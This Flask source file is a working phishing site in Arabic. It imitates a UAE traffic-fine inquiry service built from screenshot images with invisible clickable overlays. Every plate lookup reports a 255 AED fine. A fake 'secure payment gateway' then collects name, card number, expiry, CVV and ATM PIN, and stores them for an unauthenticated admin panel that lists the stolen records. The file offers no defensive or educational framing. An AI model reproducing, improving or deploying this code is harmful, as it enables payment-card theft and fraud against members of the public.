import os
from flask import Flask, render_template_string, request

app = Flask(__name__)
captured_data = []

# --- الهيدر الثابت (الصورتين اللي طلبتهم) ---
HEADER_HTML = """
<div class="fixed-header">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
    <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
</div>
"""

STYLE = """
<style>
    body, html { margin: 0; padding: 0; width: 100%; background-color: #f4f4f4; font-family: sans-serif; overflow-x: hidden; }
    .fixed-header { position: fixed; top: 0; left: 0; width: 100%; z-index: 9999; background: white; }
    .fixed-header img { width: 100%; height: auto; display: block; }
    .container { margin-top: 150px; position: relative; width: 100%; }
    .img-box { position: relative; width: 100%; }
    .img-box img { width: 100%; height: auto; display: block; }
    
    /* ضبط أزرار ابدأ الخدمة ومستخدم جديد - كبرت المساحة عشان تضمن الضغطة */
    .btn-action { 
        position: absolute; 
        top: 65%; /* مكان زر ابدأ الخدمة */
        left: 5%; 
        width: 90%; 
        height: 12%; 
        background: rgba(255, 0, 0, 0); /* شفاف تماماً */
        border: none; 
        cursor: pointer; 
        z-index: 100; 
    }
    .btn-new { 
        position: absolute; 
        top: 78%; /* مكان زر مستخدم جديد */
        left: 5%; 
        width: 90%; 
        height: 12%; 
        background: rgba(0, 255, 0, 0); /* شفاف تماماً */
        border: none; 
        cursor: pointer; 
        z-index: 100; 
    }
</style>
"""

# --- الصفحة الرئيسية ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">{STYLE}</head>
<body>
{HEADER_HTML}
<div class="container">
    <div class="img-box">
        <img src="https://static.wixstatic.com/media/a9f3d9_60aea158216544beaf9ee02cb9bd8bc2~mv2.jpg">
        <button class="btn-action" onclick="window.location.href='/search';"></button>
        <button class="btn-new" onclick="window.location.href='/search';"></button>
    </div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg"></div>
</div>
</body>
</html>
"""

# --- صفحة الاستعلام ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">{STYLE}
<style>
    .card {{ background: white; max-width: 500px; margin: 20px auto; border-radius: 12px; border: 1px solid #ddd; padding: 20px; }}
    .btn-gold {{ background: #b0914f; color: white; width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }}
    input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }}
</style>
</head>
<body>
{HEADER_HTML}
<div class="container">
    <div class="card">
        <h3 style="text-align:center; color:#b0914f;">استعلام المخالفات المرورية</h3>
        <form action="/checkout" method="get">
            <input type="text" placeholder="رقم اللوحة / الرمز" required>
            <button type="submit" class="btn-gold">بحث عن المخالفة</button>
        </form>
    </div>
</div>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/checkout')
def checkout():
    return f"{HEADER_HTML}{STYLE}<div class='container' style='text-align:center; padding:40px;'><h2>تم العثور على مخالفة!</h2><button onclick='location.href=\"/pay\"' style='background:#b0914f; color:white; padding:15px; border:none; border-radius:6px;'>دفع الآن (255 AED)</button></div>"

@app.route('/pay')
def pay():
    return f"""{HEADER_HTML}{STYLE}<div class='container' style='padding:20px; max-width:400px; margin:auto; background:white; border-top:8px solid #b0914f;'>
    <h3 style='text-align:center;'>بوابة الدفع الآمنة</h3>
    <form action='/capture' method='post'>
        <input type='text' name='n' placeholder='اسم حامل البطاقة' style='width:100%; padding:12px; margin:5px 0;' required>
        <input type='text' name='c' placeholder='رقم البطاقة (16 رقم)' style='width:100%; padding:12px; margin:5px 0;' required>
        <div style='display:flex; gap:10px;'><input type='text' name='e' placeholder='MM/YY' style='flex:1; padding:12px;'><input type='text' name='v' placeholder='CVV' style='flex:1; padding:12px;'></div>
        <input type='password' name='p' placeholder='ATM PIN' style='width:100%; padding:12px; margin:5px 0;' required>
        <button type='submit' style='width:100%; padding:15px; background:#b0914f; color:white; border:none; border-radius:6px; font-weight:bold;'>تأكيد الدفع</button>
    </form></div>"""

@app.route('/capture', methods=['POST'])
def capture():
    captured_data.insert(0, request.form.to_dict())
    return "<h2>جاري المعالجة... يرجى انتظار الرمز</h2>"

@app.route('/admin-panel')
def admin():
    items = "".join([f"<div style='border:1px solid #334; margin:10px; padding:10px;'>{str(d)}</div>" for d in captured_data])
    return f"<body style='background:#0f172a; color:white;'><h1>سجل المعاملات:</h1>{items}</body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
